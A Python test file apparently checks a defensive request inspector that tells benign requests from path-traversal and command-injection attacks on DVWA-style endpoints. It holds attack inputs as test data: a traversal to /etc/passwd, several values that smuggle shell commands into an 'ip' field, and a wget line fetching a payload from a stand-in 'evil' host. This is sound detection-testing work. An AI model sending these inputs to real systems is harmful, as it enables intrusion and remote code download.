"""Self-check: inspect_target must clear the two false positives and confirm the
two attacks that share their endpoints — the whole point of the investigation band."""
import json
from blue_agent import do_inspect_target as insp


def test_inspect_target():
    # FP 1: legit file include stays inside its directory -> benign
    e = json.loads(insp("/vulnerabilities/fi/", "GET", "page=include.php"))
    assert e["shell_metachars"] is False and e.get("path_param") is None, e

    # Attack on same endpoint: traversal escapes the dir -> malicious
    e = json.loads(insp("/vulnerabilities/fi/", "GET", "page=../../../../etc/passwd"))
    assert e["path_param"]["escapes_dir"] is True, e

    # FP 2: a bare ping IP has no shell metacharacters -> benign
    e = json.loads(insp("/vulnerabilities/exec/", "POST", "", "ip=127.0.0.1&Submit=Submit"))
    assert e["shell_metachars"] is False, e

    # Attack on same endpoint: shell metachar present -> malicious
    e = json.loads(insp("/vulnerabilities/exec/", "POST", "", "ip=127.0.0.1;cat /etc/passwd"))
    assert e["shell_metachars"] is True, e

    # Unknown endpoint is flagged as such
    e = json.loads(insp("/search.php", "GET", "q=hello"))
    assert e["known_endpoint"] is False, e
    print("inspect_target: all 5 checks pass")


if __name__ == "__main__":
    test_inspect_target()


def test_cmdi_variants():
    # all real cmdi attacks on /exec/ must show shell_metachars True
    import json as _j
    for b in ["ip=127.0.0.1 | whoami", "ip=1.1.1.1 && id", "ip=$(reboot)",
              "ip=`uname -a`", "ip=127.0.0.1; wget http://evil/sh -O /tmp/x"]:
        from blue_agent import do_inspect_target as insp
        e = _j.loads(insp("/vulnerabilities/exec/", "POST", "", b))
        assert e["shell_metachars"] is True, (b, e)
    print("cmdi variants: all flagged")
